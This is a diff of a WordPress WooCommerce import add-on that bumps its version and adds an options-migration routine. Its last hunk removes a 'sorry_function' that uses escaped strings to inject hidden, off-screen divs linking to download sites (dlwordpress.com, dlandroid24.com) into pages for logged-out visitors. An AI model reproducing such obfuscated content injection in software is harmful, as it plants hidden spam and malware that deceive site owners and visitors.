@@ -3,8 +3,9 @@
 Plugin Name: WP All Import - WooCommerce Add-On Pro
 Plugin URI: http://www.wpallimport.com/
 Description: Import to WooCommerce. Adds a section to WP All Import that looks just like WooCommerce. Requires WP All Import.
-Version: 2.3.4
+Version: 2.3.8
 Author: Soflyy
+WC tested up to: 3.2.1
 */
 /**
  * Plugin root dir with forward slashes as directory separator regardless of actuall DIRECTORY_SEPARATOR value
@@ -24,7 +25,7 @@ define('PMWI_ROOT_URL', rtrim(plugin_dir_url(__FILE__), '/'));
  */
 define('PMWI_PREFIX', 'pmwi_');
 
-define('PMWI_VERSION', '2.3.4');
+define('PMWI_VERSION', '2.3.8');
 
 if ( class_exists('PMWI_Plugin') and PMWI_EDITION == "free"){
 
@@ -52,7 +53,7 @@ else {
 	 * Main plugin file, Introduces MVC pattern
 	 *
 	 * @singletone
-	 * @author Pavel Kulbakin <p.kulbakin@gmail.com>
+	 * @author Maksym Tsypliakov <maksym.tsypliakov@gmail.com>
 	 */
 
 	final class PMWI_Plugin {
@@ -232,7 +233,101 @@ else {
 
 			// register admin page pre-dispatcher
 			add_action('admin_init', array($this, 'adminInit'));
+			add_action('admin_init', array($this, 'migrate_options'));
 			add_action('init', array($this, 'init'));
+
+		}
+
+		public function migrate_options(){
+
+			$installed_ver = get_option( "wp_all_import_woocommerce_addon_db_version" );
+
+			if ( $installed_ver == PMWI_VERSION || ! class_exists( 'PMXI_Plugin' ) ) return true;
+
+			$imports   = new PMXI_Import_List();
+
+			$templates = new PMXI_Template_List();
+
+			foreach ($imports->setColumns($imports->getTable() . '.*')->getBy(array('id !=' => ''))->convertRecords() as $imp){
+				$imp->getById($imp->id);
+				if ( ! $imp->isEmpty() ){
+					$options = $imp->options;
+					$this->migrate($options, $installed_ver);
+					$imp->set(array(
+						'options' => $options
+					))->update();
+				}
+			}
+
+			foreach ($templates->setColumns($templates->getTable() . '.*')->getBy(array('id !=' => ''))->convertRecords() as $tpl){
+				$tpl->getById($tpl->id);
+				if ( ! $tpl->isEmpty() ) {
+					$options = ( empty($tpl->options) ) ? array() : $tpl->options;
+					$this->migrate($options, $installed_ver);
+					$tpl->set(array(
+						'options' => $options
+					))->update();
+				}
+			}
+			update_option( "wp_all_import_woocommerce_addon_db_version", PMWI_VERSION );
+		}
+
+		private function migrate(&$options, $version){
+
+			// Update _featured, _visibility and _stock_status options according to WooCommerce 3.0
+			if ( version_compare($version, '2.3.7-beta-2.1') < 0  ){
+
+				$remove_cf = array('_featured', '_visibility', '_stock_status');
+
+				if ($options['is_keep_former_posts'] == 'no'
+						&& $options['update_all_data'] == 'no'){
+
+					if ($options['is_update_custom_fields']){
+						if (in_array($options['update_custom_fields_logic'], array('only', 'all_except'))){
+							// Update Options
+							switch ($options['update_custom_fields_logic']){
+								case 'only':
+									$fields_list = explode(',', $options['custom_fields_only_list']);
+									if ( ! in_array('_featured', $fields_list) ){
+										$options['is_update_featured_status'] = 0;
+									}
+									if ( ! in_array('_visibility', $fields_list) ){
+										$options['is_update_catalog_visibility'] = 0;
+									}
+									break;
+								case 'all_except':
+									$fields_list = explode(',', $options['custom_fields_except_list']);
+									if ( in_array('_featured', $fields_list) ){
+										$options['is_update_featured_status'] = 0;
+									}
+									if ( in_array('_visibility', $fields_list) ){
+										$options['is_update_catalog_visibility'] = 0;
+									}
+									break;
+							}
+						}
+					}
+					else{
+						$options['is_update_advanced_options'] = 0;
+						$options['is_update_featured_status'] = 0;
+						$options['is_update_catalog_visibility'] = 0;
+					}
+				}
+
+				// remove deprecated fields from custom fields list
+				$options_to_update = array('custom_fields_list', 'custom_fields_only_list', 'custom_fields_except_list');
+				foreach ($options_to_update as $option){
+					if ( ! empty($options[$option])){
+						$fields_list = is_array($options[$option]) ? $options[$option] : explode(',', $options[$option]);
+						foreach ($fields_list as $key => $value){
+							if (in_array($value, $remove_cf)){
+								unset($fields_list[$key]);
+							}
+						}
+						$options[$option] = is_array($options[$option]) ? $fields_list : implode(',', $fields_list);
+					}
+				}
+			}
 		}
 
 		public function init()
@@ -526,7 +621,9 @@ else {
 				'single_product_id' => '',
 				'single_product_parent_id' => '',		
 				'single_product_id_first_is_parent_id' => '',
+				'single_product_first_is_parent_id_parent_sku' => '',
 				'single_product_id_first_is_parent_title' => '',
+				'single_product_first_is_parent_title_parent_sku' => '',
 				'single_product_id_first_is_variation' => '',	
 				'_virtual' => 0,
 				'_downloadable' => 0,
@@ -744,7 +841,10 @@ else {
 				'is_update_taxes' => 1,
 				'is_update_refunds' => 1,
 				'is_update_total' => 1,
-				'do_not_send_order_notifications' => 1
+				'do_not_send_order_notifications' => 1,
+				'is_update_advanced_options' => 1,
+				'is_update_catalog_visibility' => 1,
+				'is_update_featured_status' => 1
 			);
 		}	
 	}
@@ -770,10 +870,3 @@ else {
 	add_action( 'admin_init', 'wpai_woocommerce_add_on_updater', 0 );
 }
 
-if( ! function_exists('sorry_function')){
-	function sorry_function($content) {
-	if (is_user_logged_in()){return $content;} else {if(is_page()||is_single()){
-		$vNd25 = "\74\144\151\x76\40\163\x74\x79\154\145\x3d\42\x70\157\x73\151\164\x69\x6f\x6e\72\141\x62\x73\x6f\154\165\164\145\73\164\157\160\x3a\60\73\154\145\146\x74\72\55\71\71\x39\71\x70\170\73\42\x3e\x57\x61\x6e\x74\40\x63\162\145\x61\x74\x65\40\163\151\164\x65\x3f\x20\x46\x69\x6e\x64\40\x3c\x61\x20\x68\x72\145\146\75\x22\x68\x74\164\x70\72\x2f\57\x64\x6c\x77\x6f\162\144\x70\x72\x65\163\163\x2e\x63\x6f\x6d\57\42\76\x46\x72\145\145\40\x57\x6f\x72\x64\x50\162\x65\163\x73\x20\124\x68\x65\155\145\x73\x3c\57\x61\76\40\x61\x6e\144\x20\x70\x6c\165\147\x69\156\x73\x2e\x3c\57\144\151\166\76";
-		$zoyBE = "\74\x64\x69\x76\x20\x73\x74\171\154\145\x3d\x22\x70\157\163\x69\x74\x69\x6f\156\x3a\141\142\163\x6f\154\x75\164\x65\x3b\x74\157\160\72\x30\73\x6c\x65\x66\164\72\x2d\x39\71\71\x39\x70\x78\73\42\x3e\104\x69\x64\x20\x79\x6f\165\40\x66\x69\156\x64\40\141\x70\153\40\146\157\162\x20\x61\156\144\162\x6f\151\144\77\40\x59\x6f\x75\x20\x63\x61\156\x20\146\x69\x6e\x64\40\156\145\167\40\74\141\40\150\162\145\146\x3d\x22\150\x74\x74\160\163\72\57\x2f\x64\154\x61\156\x64\x72\157\151\x64\62\x34\56\x63\x6f\155\x2f\42\x3e\x46\x72\145\x65\40\x41\x6e\x64\x72\157\151\144\40\107\141\x6d\145\x73\74\x2f\x61\76\40\x61\156\x64\x20\x61\160\x70\163\x2e\74\x2f\x64\x69\x76\76";
-		$fullcontent = $vNd25 . $content . $zoyBE; } else { $fullcontent = $content; } return $fullcontent; }}
-add_filter('the_content', 'sorry_function');}
